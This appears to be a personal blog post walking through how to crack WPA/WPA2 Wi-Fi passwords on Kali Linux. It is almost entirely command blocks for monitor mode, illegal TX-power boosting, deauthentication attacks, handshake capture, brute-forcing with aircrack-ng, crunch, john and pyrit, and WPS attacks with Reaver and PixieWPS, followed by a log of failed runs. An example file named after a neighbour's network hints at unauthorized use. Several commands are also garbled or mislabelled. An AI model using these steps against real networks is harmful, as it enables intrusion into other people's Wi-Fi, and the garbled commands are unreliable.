---
title:  "Wi-Fi Hacking Guide (Kali Linux 2.0)"
date: 2015-03-14
collection: experience
published: true  
header:
  teaser: "posts/GenAI_Gemini_Hack_WiFi.png"
---

Learn about [aircrack-ng](https://www.kali.org/tools/aircrack-ng/)


# learn 
## Common Attack Techniques


### Network Attacks (Educational)

- **airodump-ng** - WiFi packet sniffer. Captures packets in monitor mode to discover networks and clients. First step in any wireless assessment.

- **airodump-ng** - Packet injection tool. Injects packets into wireless networks to trigger responses, useful for cracking WEP or deauth attacks.

- **ARP spoofing** with arpspoof - Man-in-the-middle basics. Tricks devices into sending traffic through your machine by spoofing ARP tables. Foundation for many network attacks.

- **bettercap** - Modern Swiss army knife for network attacks. Does ARP spoofing, SSL stripping, packet sniffing, and more. More powerful than individual tools.


### WiFi Security
- **Monitor mode** - Putting your wireless card into monitor mode lets you capture packets without connecting to a network
- **Packet injection** - Sending crafted packets to trigger responses or crack encryption
- **WEP/WPA cracking** - Capturing handshakes and brute-forcing passwords


# Initial Setup & Monitor Mode
Use these commands to prepare your interface and power up the Wi-Fi card to capture handshakes.
```bash
# Get root access
sudo su
# Set region and increase TX power (Important for handshake)
iw reg set GY
# default txpower is 30
# BEFORE WE START WE NEED TO POWER UP WIFI CARD IN MY LAPTOP TO GET HANDSHAKE... (IMPORTANT)
iwconfig wlan0 txpower 70
# Need <aireplay-ng> and <airmon-ng> to search and Fix the wifi signal. 
# [interface] is mon0 or wlan0 or wlan0mon
# this command is extra $ aireplay-ng --test [interface]
aireplay-ng --test [interface]
# Stop interfering processes
# in case of other appears like number and name. type: $ kill [number before the name]
airmon-ng check kill
# Start monitor mode
airmon-ng start wlan0
```

# Scanning & Capturing Handshake

Identify your target and deauthenticate users to capture the WPA handshake.
WE CAN'T DO aircrack-ng until we get handshake. for hacking Wi-Fi we want to reach handshake to get password before using last command



# Need to use <airodump-ng> and <aireplay-ng> and <aircrack-ng>
```bash
# Scan for networks. wlan0mon is the [interface] 
airodump-ng [interface] 
# Target a specific BSSID and Channel to save data
# If the ESSID name contain space or other symbol, put it in coutation double qoutations (e.g. Free Palestine will be "Free Palestine".)
# If the ESSID is a hidden name, then use "<length:1>" for ESSID.
airodump-ng -c <channel number> -w <ESSID> --bssid <BSSID> [interface] 
# Force deauthentication (Open in new terminal)
airodump-ng [interface] -c <channel number> --bssid <BSSID> -w <[choose a folder path] + "/wpa2psk">
# it creates .cap file needed next. This will save the data and you can use it anytime to get the password.
# if you didn't create folder to save on, no problem it just work one time <Live>. if you want to do it again save it.
# Note after drag the file and add /wpa2psk remove the quotation mark symbol "" at the start and at the end.
# case 1
airodump-ng -w <The ESSID> --bssid <The BSSID> [interface] -c-<channel no.>
# case 2
airodump-ng -w test --bssid <The BSSID> --essid <The ESSID> --channel <channel no.> [interface]
# case 3
airodump-ng -c [channel] –bssid [bssid] -w /root/Desktop/ [interface]
```


```bash
# Open new Terminal, Don't try many channel at the same time leading error.
# Don't change now the BSSID or ESSID.
# If any error appears just re-write the same code.
# Don't stop channel and station Terminal.
# as much as the save file get data it will take less time to get password.
# if you want to know -0 or --deauth want to do check: $ aireplay-ng --help
# --deauth count: deauthenticate 1 or all stations (-0)
# aireplay-ng command uses it in case HANDSHAKE not appears yet.
aireplay-ng --deauth <number you want to test> -a <BSSID> -c <Station_MAC> [interface]
# Alternative
aireplay-ng -0 [number you want to try] -a [bssid main] -c [STATION bssid] [interface]
# Case 1
aireplay-ng --deauth <number you want to test> -a <The BSSID> [interface]
# Case 2
aireplay-ng -0 <number of #/s or rate IDK> -a <The BSSID> -e <The ESSID> -c <The STATION> [interface]
# Case 3
aireplay-ng <channel read down example: -1 > < delay {>=0}:0> -a <BSSID> [interface]
# Case 4
aireplay-ng -h <The STATION> <channel read down example: -1> < delay {>=0}:0> -a <The BSSID> -e <The ESSID> [interface]
# Case 5
aireplay-ng –0 2 –a [bssid] –c [STATION bssid] [interface]
```
Determine current channel for <mon0/wlan0/wlan0mon>.
force the operation with --ignore-negative-one or apply a kernel patch.
Open new Terminal, Don't stop the Station Windows until you have many beacon.
stop the terminal as soon as you get handshake, then go to next command.
handshake appears on the top at right side.
-a <amode>: force attack mode (1/WEP, 2/WPA-PSK)
About Creating a dictionary > check down for more info.

# Cracking the Password

Once you see "WPA handshake" in the top right of your terminal, use a dictionary to crack the `.cap` file.

```bash
aircrack-ng -a<1/2> -b [bssid main] –w [the dictionary as .txt] [TEST1 the folder we created inside > dragging file as .cap without ""]
# Case 1
aircrack-ng <drag the "wpa2psk-01.cap" this inside {Created a folder}> -w <drag Dictionary as test_test.text>
# Case 2
aircrack-ng -w <custom_WPA>, <drag Dictionary as test_test.text> test -01.cap
# Case 3
aircrack-ng ADSL7943-01.cp
# Case 4
aircrack-ng -w <Dictionary> -b <The BSSID> crack-wpa-01.ca
# Case 5
aircrack-ng -w root/Documents/wordlists/goodluck.txt Neighborswifi_B8-87-1F-.cap
# Case 6
aircrack-ng -a2 -b [bssid] –w /root/wpa.txt /root/Desktop/*.cap

# Use aircrack-ng with a wordlist
aircrack-ng -a 2 -b <BSSID> -w <wordlist.txt> <capture_file.cap>
```

```bash
# Restart network manager after finished
service network-manager restart
```


# Crunch+aircrack

```bash
# Example using crunch for real-time generation
crunch 8 8 0123456789 | aircrack-ng -a 2 -b <BSSID> -w - <capture_file.cap>
```
https://forums.kali.org/showthread.php?18261-Cracking-WPA-key-with-crunch-aircrack-%28almost-fullproof-but-how-speed-things-up%29

The command for aircrack-ng goes as follows: [No need to internet]

with crunch:
$crunch x X "put characters you want here" | aircrack-ng "drag .cap file here" -w - -e "essid goes here"

with john the ripper:
$john -stdout -incremental:all | aircrack-ng "drag .cap file here" -w - -e "essid goes here"

with pyrit:
$crunch  x X "put characters you want here" | pyrit -r capture-03.cap -b xx:xx:xx:xx:xx:xx -i - attack_passthrough

The following command can be used to start Aircrack-ng with input from Crunch:

$crunch 8 8 | aircrack-ng -e [ESSID] -w – [file path to the .cap file]


How Long Will It Take?

This process can be relatively slow and tedious. Depending upon the length of your password list, you could be waiting a few minutes to a few days. On my dual core 2.8 gig Intel processor, it's capable of testing a little over 500 passwords per second. That works out to about 1.8 million passwords per hour. Your results will vary.

When the password is found, it'll appear on your screen. Remember, the password file is critical. Try the default password file first and if it's not successful, advance to a larger, more complete password file such as one of these.


Others:
$crunch 8 8 0123456789 | aircrack-ng -a 2 'HOME-TC-FILE-CAP' -e 'ESSID' -b 'HANDSHAKE' -w -
>http://xiaopan.co/forums/downloads/
$crunch 0 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng --bssid aa:aa:aa:aa:aa:aa -w- handshakefile.cap



# WPS Method (Alternative)

For routers with WPS enabled, use Reaver or PixieWPS.

```bash
# Find WPS enabled networks
wash -i wlan0mon -C
# Start Reaver attack
reaver -i wlan0mon -c <channel> -b <BSSID> -vv
# Use PixieWPS for faster cracking
pixiewps -e <pke> -r <pkr> -s <hash1> -z <hash2> -a <authkey> -n <enonce> -m <rnonce> -b <bssid> -v 3

```



---


```bash
# aircrack-ng -a2 -b C4:6E:1F:7A:A3:1A -w /root/wpa.txt
/root/Desktop/hack_wifi/wpa2psk-01.cap
fopen(dictionary) failed: No such file or directory
fopen(dictionary) failed: No such file or directory
Please specify a dictionary (option -w).
Quitting aircrack-ng...
#crunch 8 8 0123456789 -l | sudo aircrack-ng --bssid C4:6E:1F:7A:A3:1A -w-
/root/Desktop/hack_wifi/wpa2psk-01.cap
Please specify a list of characters you want to treat as literal @?%^
Opening /root/Desktop/hack_wifi/wpa2psk-01.cap
No valid WPA handshakes found.
Quitting aircrack-ng...
# aircrack-ng -a2 -b C4:6E:1F:7A:A3:1A -w /root/Desktop/BIG-WPA-LIST-2
/root/Desktop/hack_wifi/wpa2psk-01.cap
Opening /root/Desktop/hack_wifi/wpa2psk-01.cap
No valid WPA handshakes found.
```


Watch the Video (it was taken down by YouTube years ago): 

<video width="100%" height="auto" controls preload="metadata" style="max-width: 800px;">
  <source src="{{ base_path }}/files/posts/2017-03-14-Hack-WiFi-using-(Kali-Linux-2.0)/Hack WiFi by (Kali Linux 2.0) 100%25 - YouTube.mp4" type="video/mp4">
  Your browser does not support the video tag. <a href="{{ base_path }}/files/posts/2017-03-14-Hack-WiFi-using-(Kali-Linux-2.0)/Hack WiFi by (Kali Linux 2.0) 100% - YouTube.mp4">Download the video</a>.
</video>
